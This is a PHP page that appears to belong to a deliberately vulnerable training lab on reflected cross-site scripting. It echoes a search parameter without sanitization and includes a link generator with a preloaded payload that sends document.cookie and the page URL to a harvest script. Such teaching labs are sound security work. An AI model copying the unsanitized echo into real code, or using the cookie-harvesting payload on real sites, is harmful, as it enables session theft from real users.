<?php
session_start();
require_once 'config.php';

// Check if logged in
if (!isset($_SESSION['user_id'])) {
    header("Location: index.php");
    exit;
}

// 1. THE VULNERABLE ENDPOINT
// If 'q' parameter exists, we ECHO it back WITHOUT sanitization.
// This is the definition of Reflected XSS.
$search_query = "";
if (isset($_GET['q'])) {
    $search_query = $_GET['q'];
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reflected XSS - Attack Generator</title>
    <link rel="stylesheet" href="style.css">
    <script>
        function generateLink() {
            var payload = document.getElementById('payload').value;
            // We encode the payload so it can be safely put in the URL parameter
            var encodedPayload = encodeURIComponent(payload);
            var baseUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
            var fullUrl = baseUrl + "?q=" + encodedPayload;
            
            var resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '<p>Send this link to your victim:</p>' + 
                                  '<a href="' + fullUrl + '">' + fullUrl + '</a>' +
                                  '<p style="font-size:0.8em; color:#8b949e;">(Clicking this will execute the script immediately)</p>';
        }

        function setExample() {
            var example = "<script>fetch('harvest.php?data=' + encodeURIComponent(document.cookie) + '&location=' + window.location.href);<\/script>";
            document.getElementById('payload').value = example;
        }
    </script>
</head>
<body>
    <div class="container">
        <?php include 'header.php'; ?>
        
        <div style="text-align: right; margin-bottom: 10px; color: #8b949e;">
            <span>Welcome, <b><?php echo htmlspecialchars($_SESSION['username']); ?></b></span>
        </div>

        <!-- The Vulnerable Section -->
        <?php if ($search_query): ?>
            <div class="card" style="border-color: var(--error-color);">
                <h3>Search Results</h3>
                <p>You searched for: <b><?php echo $search_query; ?></b></p> <!-- VULNERABLE: Outputting directly -->
            </div>
        <?php endif; ?>

        <div class="card">
            <h1><span style="color:#f85149;">></span> URL Attack Generator (Reflected XSS)</h1>
            <p>
                This page has a vulnerability: it echoes back whatever you put in the <code>?q=</code> parameter.
                Use this tool to generate a malicious link.
            </p>

            <div style="margin-bottom: 20px;">
                <label for="payload">Malicious Script (Payload):</label>
                <textarea id="payload" rows="4" style="width: 100%; background: var(--bg-color); color: var(--text-color); border: 1px solid var(--border-color); border-radius: 6px; padding: 10px; margin-bottom: 10px;"></textarea>
                
                <div style="display: flex; gap: 10px;">
                    <button onclick="generateLink()">Generate Attack URL</button>
                    <button onclick="setExample()" style="background-color: var(--card-bg); border: 1px solid var(--accent-color); color: var(--accent-color);">Load Harvester Payload</button>
                </div>
            </div>

            <div id="result" class="sql-log" style="min-height: 50px;">
                <!-- Generated link will appear here -->
                <span style="color: #8b949e;">Generated link will appear here...</span>
            </div>
        </div>
        
        <div class="card">
             <h3>How it works</h3>
             <ol>
                 <li>You write a script (like an alert or a cookie stealer).</li>
                 <li>The tool encodes it into a URL parameter.</li>
                 <li>When someone clicks that URL, the PHP script echoes the parameter back to their browser.</li>
                 <li>The browser sees the <code>&lt;script&gt;</code> tags and executes them.</li>
             </ol>
             <p><i>Try opening the generated link in a different browser/Incognito window to simulate attacking another user.</i></p>
        </div>
    </div>
</body>
</html>
